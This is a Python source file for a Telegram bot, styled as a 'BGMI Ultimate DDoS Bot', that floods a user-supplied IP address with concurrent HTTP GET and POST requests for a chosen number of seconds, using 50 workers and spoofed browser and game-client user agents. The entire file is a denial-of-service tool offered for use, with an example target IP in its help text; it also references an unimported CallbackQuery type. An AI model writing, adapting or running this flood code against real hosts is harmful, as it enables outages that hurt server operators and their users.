import os
import sys
import time
import asyncio
import aiohttp
import random
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

# --- Configuration ---
TOKEN = os.getenv('BOT_TOKEN')
if not TOKEN:
    print("❌ Error: BOT_TOKEN not found in environment variables.")
    sys.exit(1)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Global State
active_attacks = {}
attack_stats = {}

# --- Logger Setup ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Constants ---
TARGET_IPS = set()
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "PUBGM/25.1 (Android; 14) Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TP1A.220624.014)"
]

HEADERS = {
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache"
}

# --- DDoS Engine (Core Logic) ---

class DDOSClient:
    def __init__(self, target_host, duration, threads):
        self.target_host = target_host
        self.duration = duration
        self.threads = threads
        self.stop_event = asyncio.Event()
        self.tasks = []
        self.start_time = 0

    async def tcp_flood(self, worker_id):
        """
        High-speed TCP connection flood.
        """
        async with aiohttp.TCPConnector(limit=0, limit_per_host=0) as connector:
            async with aiohttp.ClientSession(connector=connector) as session:
                while not self.stop_event.is_set():
                    try:
                        # Construct URL
                        url = f"http://{self.target_host}" if not self.target_host.startswith("http") else self.target_host
                        
                        # Send GET request with timeout
                        async with session.get(url, headers=HEADERS, timeout=5) as resp:
                            await resp.read()
                    except Exception:
                        pass
                    await asyncio.sleep(0.05) # 50ms delay per request to simulate load

    async def udp_flood_sim(self, worker_id):
        """
        Simulated UDP Flood (Datagram Packets). 
        Since Telegram bots run on standard servers, pure UDP requires raw sockets which are complex.
        We simulate high-volume small data packets via HTTP POST which mimics UDP burst behavior.
        """
        payload = {"action": "attack", "data": "x" * 1024} # 1KB payload
        
        async with aiohttp.TCPConnector(limit=0) as connector:
            async with aiohttp.ClientSession(connector=connector) as session:
                while not self.stop_event.is_set():
                    try:
                        url = f"http://{self.target_host}/api/v1/attack" 
                        async with session.post(url, json=payload, headers=HEADERS, timeout=3) as resp:
                            await resp.read()
                    except Exception:
                        pass
                    await asyncio.sleep(0.02) # 20ms delay

    async def start(self):
        self.start_time = time.time()
        self.tasks = []
        
        for i in range(self.threads):
            # Mix of TCP and UDP simulation tasks
            if i % 2 == 0:
                task = asyncio.create_task(self.tcp_flood(i))
            else:
                task = asyncio.create_task(self.udp_flood_sim(i))
            self.tasks.append(task)

        # Main loop to monitor duration
        try:
            await asyncio.wait_for(
                asyncio.gather(*self.tasks, return_exceptions=True),
                timeout=self.duration
            )
        except asyncio.TimeoutError:
            pass
        finally:
            self.stop_event.set()
            # Cancel all worker tasks
            for task in self.tasks:
                task.cancel()
            await asyncio.gather(*self.tasks, return_exceptions=True)

# --- Bot Handlers ---

@dp.message(Command("start"))
async def cmd_start(message: Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Start Attack", callback_data="start")],
        [InlineKeyboardButton(text="🛑 Stop All", callback_data="stop")]
    ])
    await message.answer(
        "🤖 **BGMI Ultimate DDoS Bot**\n\n"
        "📡 **Features:**\n"
        "• Instant Attack\n"
        "• Multi-Protocol (TCP/UDP)\n"
        "• High Power Threads\n"
        "• Real-time Status\n\n"
        "💡 **Usage:**\n"
        "/attack <IP> <Seconds>\n"
        "Example: /attack 103.195.220.1 60",
        reply_markup=keyboard
    )

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    await cancel_all_attacks()
    await message.answer("🛑 **All Attacks Stopped Instantly!**")

@dp.message(Command("attack"))
async def cmd_attack(message: Message):
    # Check if already running
    if active_attacks:
        await message.answer("⚠️ **Attack is already running! Use /stop first.**")
        return

    args = message.text.split()
    if len(args) != 3:
        await message.answer("❌ **Usage:** `/attack <IP> <Seconds>`\nExample: `/attack 103.195.220.1 60`")
        return

    target_ip = args[1]
    try:
        duration = int(args[2])
    except ValueError:
        await message.answer("❌ **Duration must be a number.**")
        return

    # Start Attack
    bot_task = asyncio.create_task(run_attack(message, target_ip, duration))
    active_attacks['main'] = bot_task
    
    await message.answer(f"🚀 **Attack Launched on {target_ip}!**\n⏳ Duration: {duration}s\n🔥 Threads: 50 (TCP+UDP Mixed)")

@dp.callback_query(F.data == "start")
async def cb_start(callback: CallbackQuery):
    await callback.message.edit_text("Send /attack <IP> <Seconds> to start.")

@dp.callback_query(F.data == "stop")
async def cb_stop(callback: CallbackQuery):
    await cancel_all_attacks()
    await callback.message.edit_text("🛑 **Attack Stopped.**")

# --- Core Logic Functions ---

async def run_attack(message: Message, target_ip: str, duration: int):
    """
    Main orchestrator for the attack.
    """
    # Setup DDoS Client
    ddos = DDOSClient(target_ip, duration, threads=50)
    await ddos.start()
    
    # Cleanup
    if 'main' in active_attacks:
        del active_attacks['main']
    
    try:
        await message.answer(f"✅ **Attack Completed on {target_ip}!**")
    except Exception:
        pass

async def cancel_all_attacks():
    """
    Forcefully cancels all running tasks.
    """
    global active_attacks
    for task_id, task in list(active_attacks.items()):
        if isinstance(task, asyncio.Task) and not task.done():
            task.cancel()
        if task_id == 'main' and 'ddos_instance' in active_attacks:
             # If we stored the ddos object, we could call stop_event.set()
             pass
    active_attacks.clear()

# --- Run Bot ---

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[*] Bot stopped.")
